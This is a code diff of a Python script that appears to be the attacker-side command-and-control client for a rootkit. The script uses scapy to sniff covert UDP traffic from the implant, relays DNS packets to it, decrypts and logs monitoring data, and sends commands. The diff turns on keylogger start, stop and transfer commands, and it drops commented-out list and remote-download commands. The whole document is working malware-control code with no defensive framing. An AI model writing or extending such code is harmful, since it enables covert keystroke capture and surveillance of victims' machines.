@@ -73,6 +73,7 @@ def relay_dns_query(pkt):
     response[IP].dst = f"{ROOTKIT_IP}"
     send(response, verbose=0)
 
+
 def subprocess_packet_handler(pkt):
     """
     
@@ -88,19 +89,23 @@ def subprocess_packet_handler(pkt):
     if pkt[IP].id == MONITOR_IDENTIFICATION:
         write_monitor_data(encrypted_message)
 
+
 def write_keylog_data(data):
     pass
+
 
 def write_monitor_data(data):
     b = BLOCK_ENCRYPTION_HANDLER.decrypt(data)
     msg = b.decode("utf-8")
     with open("logs/monitor.log", "a") as f:
-        f.write(msg + "\n")
+        f.write(msg)
+
 
 def subprocess_start():
     """
     """
     sniff(filter=f"ip src host {ROOTKIT_IP} and not port ssh and udp and not icmp", iface=f"{NETWORK_INTERFACE}", prn=subprocess_packet_handler)
+
 
 def send_udp(data: str):
     """
@@ -163,26 +168,14 @@ if __name__ == "__main__":
                 break
         if argc == 2:
             data = argv[0] + " " + argv[1]
-            # if argv[0] == LIST:
-            #     send_udp(data)
-            #     receive_single_response()
-            #     continue
-            # if argv[0] == KEYLOGGER:
-            #     if argv[1] in [START, STOP, TRANSFER]:
-            #         send_udp(data)
-            #     continue
+            if argv[0] == KEYLOGGER:
+                if argv[1] in [START, STOP, TRANSFER]:
+                    send_udp(data)
+                continue
             if argv[0] == WATCH:
                 send_udp(data)
                 receive_single_response()
                 continue
-        # if argc == 3:
-        #     if argv[0] == WGET:
-        #         url = argv[1]
-        #         filepath = argv[2]
-        #         data = argv[0] + " " + argv[1] + " " + argv[2]
-        #         send_udp(data)
-        #         receive_single_response()
-        #         continue
         else:
             print(f"Invalid Command: {command}")
     decode_process.kill()
